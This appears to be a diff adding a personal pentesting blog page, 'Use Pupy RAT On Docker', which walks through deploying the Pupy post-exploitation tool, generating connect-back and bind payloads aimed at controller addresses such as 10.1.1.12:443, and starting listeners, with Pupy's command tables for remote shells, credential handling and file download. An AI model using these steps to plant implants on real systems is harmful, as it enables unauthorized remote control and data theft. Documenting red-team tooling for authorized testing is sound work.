@@ -1,0 +1,508 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon-light.ico">
+  <link rel="icon" type="image/png" href="/img/favicon-light.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="渗透测试笔记、日常问题记录">
+  <meta name="author" content="Ayu">
+  <meta name="keywords" content="">
+  <title>Use Pupy RAT On Docker - Black Book</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/dracula.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"0xhc.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Ayu's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/assets/blog/84707606_p0.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Use Pupy RAT On Docker">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-12-17 17:47" pubdate>
+        2020年12月17日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      497 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      9
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Use Pupy RAT On Docker</h1>
+            
+            <div class="markdown-body">
+              <p>Pupy Remote Administrator Tools</p>
+<a id="more"></a>
+
+<blockquote>
+<p>Pupy is an opensource, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool mainly written in python</p>
+</blockquote>
+<br/>
+
+<h2 id="Pull"><a href="#Pull" class="headerlink" title="Pull"></a>Pull</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">docker pull alxchk/pupy:unstable<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h2 id="Deploy"><a href="#Deploy" class="headerlink" title="Deploy"></a>Deploy</h2><p>生成 SSH Key</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ssh-keygen -f pupy<br></code></pre></div></td></tr></table></figure>
+<p>创建 pupy 项目目录(存放 Payload 输出、Key等)</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">mkdir -p /tmp/pupy<br></code></pre></div></td></tr></table></figure>
+<p>docker run</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">docker run -d -p 2022:22 -v /tmp/pupy:/projects alxchk/pupy:unstable<br></code></pre></div></td></tr></table></figure>
+<p>复制生成的 SSH 公钥到 <code>/tmp/pupy/keys/authorized_keys</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">cp pupy.pub /tmp/pupy/keys/authorized_keys<br></code></pre></div></td></tr></table></figure>
+<p>登录到 Pupy</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ssh pupy@127.0.0.1 -p 2022 -i pupy<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h2 id="Basic-Usage"><a href="#Basic-Usage" class="headerlink" title="Basic Usage"></a>Basic Usage</h2><p>查看配置 (IP、Port等)</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">docker inspect container_name<br></code></pre></div></td></tr></table></figure>
+<p>登录进入的基本窗口是 Tmux，默认前缀键：<code>C-b</code></p>
+<p><img src="/assets/img/2020_12_17_17_47_pupy_rat_docker_use/2020-12-17-pm-6.10.57.png" srcset="/img/loading.gif" alt="img"></p>
+<br/>
+
+<p>生成 Payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">gen -f client -O linux -A x64 connect -c 172.17.0.2:8080<br></code></pre></div></td></tr></table></figure>
+<p>Sessions 列表</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sessions<br></code></pre></div></td></tr></table></figure>
+<p><img src="/assets/img/2020_12_17_17_47_pupy_rat_docker_use/2020-12-17-pm-6.17.51.png" srcset="/img/loading.gif" alt="sessions"></p>
+<p>监听器: Listen</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">listen -a ssl 443<br>listen -a http 4444<br><br>listen -L<br></code></pre></div></td></tr></table></figure>
+<p><img src="/assets/img/2020_12_17_17_47_pupy_rat_docker_use/2020-12-17-pm-6.54.47.png" srcset="/img/loading.gif" alt="Listen"><br><img src="/assets/img/2020_12_17_17_47_pupy_rat_docker_use/2020-12-17-pm-8.32.07.png" srcset="/img/loading.gif" alt="Listen"></p>
+<br/>
+
+<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">gen -f <span class="hljs-tag">&lt;<span class="hljs-name">format</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">launcher</span>&gt;</span> -t <span class="hljs-tag">&lt;<span class="hljs-name">transport</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
+<p>Command</p>
+<figure class="highlight prolog"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs prolog">[-f &#123;client,py,pyinst,py_oneliner,ps1,ps1_oneliner,rubber_ducky,csharp,.<span class="hljs-symbol">NET</span>,.<span class="hljs-symbol">NET_oneliner</span>&#125;]<br>[-<span class="hljs-symbol">O</span> &#123;android,windows,linux,solaris&#125;] [-<span class="hljs-symbol">A</span> &#123;x86,x64,armhf&#125;]<br>[-<span class="hljs-symbol">U</span>] [-<span class="hljs-symbol">P</span> <span class="hljs-symbol">PACKER</span>] [-<span class="hljs-symbol">S</span>] [-o <span class="hljs-symbol">OUTPUT</span>]<br>[-d &lt;<span class="hljs-symbol">ATTEMPTS</span>&gt; &lt;<span class="hljs-symbol">MIN</span> <span class="hljs-symbol">SEC</span>&gt; &lt;<span class="hljs-symbol">MAX</span> <span class="hljs-symbol">SEC</span>&gt;] [-<span class="hljs-symbol">D</span> <span class="hljs-symbol">OUTPUT_DIR</span>]<br>[-s <span class="hljs-symbol">SCRIPTLET</span>] [-l] [-<span class="hljs-symbol">E</span>] [--no-use-proxy]<br>[--oneliner-nothidden] [--debug-scriptlets] [--debug]<br>[--workdir <span class="hljs-symbol">WORKDIR</span>]<br>[&#123;bind,auto_proxy,dnscnc,connect&#125;] ...<br></code></pre></div></td></tr></table></figure>
+<p>format</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">client</span>, py, pyinst, py_oneliner, ps<span class="hljs-number">1</span>, ps<span class="hljs-number">1</span>_oneliner, rubber_ducky, csharp, .NET, .NET_oneliner<br></code></pre></div></td></tr></table></figure>
+<blockquote>
+<p>client : executable to run on the target (.exe, .dll, .lin, .so).</p>
+</blockquote>
+<br/>
+
+<p>连接方式 (绑定、反射、DNS等)</p>
+<figure class="highlight perl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs perl"><span class="hljs-keyword">bind</span>, auto_proxy ,dnscnc, <span class="hljs-keyword">connect</span><br></code></pre></div></td></tr></table></figure>
+<p>生成</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">gen</span> client -O windows -A x<span class="hljs-number">64</span> connect -c <span class="hljs-number">10.1.1.12:443</span> -t http<br><br><span class="hljs-attribute">gen</span> ps<span class="hljs-number">1</span> -O windows -A x<span class="hljs-number">86</span> bind --host <span class="hljs-number">10.1.1.12</span> --port <span class="hljs-number">8080</span><br></code></pre></div></td></tr></table></figure>
+<p><img src="/assets/img/2020_12_17_17_47_pupy_rat_docker_use/2020-12-17-pm-8.35.02.png" srcset="/img/loading.gif" alt="gen"></p>
+<br/>
+
+<h2 id="Base-Command"><a href="#Base-Command" class="headerlink" title="Base Command"></a>Base Command</h2><h3 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h3><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">&#123; COMMANDS &#125;<br>COMMAND   DESCRIPTION<br><span class="hljs-comment">-----------------------------------------------------------------------</span><br>dnscnc    DNSCNC control<br>jobs      Manage Jobs<br>help      <span class="hljs-keyword">Show</span> help<br>exposed   list exposed objects/methods<br>python    <span class="hljs-keyword">Start</span> the <span class="hljs-keyword">local</span> python interpreter (<span class="hljs-keyword">for</span> debugging purposes)<br>sessions  list/interact <span class="hljs-keyword">with</span> established sessions<br><span class="hljs-keyword">restart</span>   <span class="hljs-keyword">Restart</span> pupysh<br>tag       Assign tag <span class="hljs-keyword">to</span> <span class="hljs-keyword">current</span> <span class="hljs-keyword">session</span><br><span class="hljs-keyword">exit</span>      <span class="hljs-keyword">Exit</span> Shell<br><span class="hljs-keyword">connect</span>   <span class="hljs-keyword">Connect</span> <span class="hljs-keyword">to</span> the bind payload<br>run       Run a module <span class="hljs-keyword">on</span> one <span class="hljs-keyword">or</span> multiple clients<br>logging   <span class="hljs-keyword">Show</span>/<span class="hljs-keyword">set</span> <span class="hljs-keyword">log</span> <span class="hljs-keyword">level</span><br>config    <span class="hljs-keyword">Work</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">configuration</span> file<br>gen       Generate payload<br>creds     Credentials manager<br><span class="hljs-keyword">listen</span>    <span class="hljs-keyword">start</span>/stop/<span class="hljs-keyword">show</span> <span class="hljs-keyword">current</span> listeners<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h3 id="ALIASED-MODULES"><a href="#ALIASED-MODULES" class="headerlink" title="ALIASED MODULES"></a>ALIASED MODULES</h3><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">&#123; ALIASED MODULES &#125;<br>MODULE   DESCRIPTION<br>------------------------------------------------------------<br><span class="hljs-built_in">getpid</span>   <span class="hljs-keyword">list</span> process information<br><span class="hljs-keyword">exit</span>     <span class="hljs-keyword">exit</span> the client <span class="hljs-keyword">on</span> the other side<br>getppid  <span class="hljs-keyword">list</span> parent process information<br><span class="hljs-keyword">cd</span>       <span class="hljs-keyword">change</span> directory<br>alive    request <span class="hljs-keyword">to</span> send keepalive packets <span class="hljs-keyword">on</span> rpyc level<br>rm       <span class="hljs-built_in">remove</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">file</span> <span class="hljs-built_in">or</span> <span class="hljs-keyword">a</span> directory<br>netstat  <span class="hljs-keyword">list</span> terminal sessions<br><span class="hljs-keyword">last</span>     <span class="hljs-keyword">list</span> terminal sessions<br><span class="hljs-keyword">w</span>        <span class="hljs-keyword">list</span> terminal sessions<br>date     Get current date<br><span class="hljs-keyword">cp</span>       <span class="hljs-keyword">copy</span> <span class="hljs-keyword">file</span> <span class="hljs-built_in">or</span> directory<br><span class="hljs-keyword">ps</span>       <span class="hljs-keyword">list</span> processes<br><span class="hljs-built_in">mkdir</span>    create <span class="hljs-keyword">an</span> <span class="hljs-built_in">empty</span> directory<br>forward  Local/remote port forwarding <span class="hljs-built_in">and</span> SOCKS proxy<br><span class="hljs-keyword">ls</span>       <span class="hljs-keyword">list</span> <span class="hljs-built_in">system</span> <span class="hljs-keyword">files</span><br><span class="hljs-keyword">cat</span>      show contents of <span class="hljs-keyword">a</span> <span class="hljs-keyword">file</span><br>mv       <span class="hljs-keyword">move</span> <span class="hljs-keyword">file</span> <span class="hljs-built_in">or</span> directory<br>ip       <span class="hljs-keyword">list</span> interfaces<br>http     Trivial Get/Post requests via HTTP protocol<br>getuid   <span class="hljs-built_in">get</span> username<br><span class="hljs-keyword">pwd</span>      Get current working dir<br></code></pre></div></td></tr></table></figure>
+<br/>
+
+<h3 id="Aliases"><a href="#Aliases" class="headerlink" title="Aliases"></a>Aliases</h3><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">&#123; ALIASES &#125;<br>ALIAS    COMMAND<br>----------------------------<br>info     get_info<br>pyexec   pyexec<br>exec     shell_exec<br>ps       ps<br>migrate  migrate<br>shell    interactive_shell<br>kill     process_kill<br>mount    drives<br>du       download -S<br></code></pre></div></td></tr></table></figure>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Tools/">Tools</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/01/07/10_44_CVE_2020_17518_17519/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CVE-2020-17518~17519 漏洞复现</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/11/30/13_25_pe_format_note/">
+                        <span class="hidden-mobile">PE Format Note</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
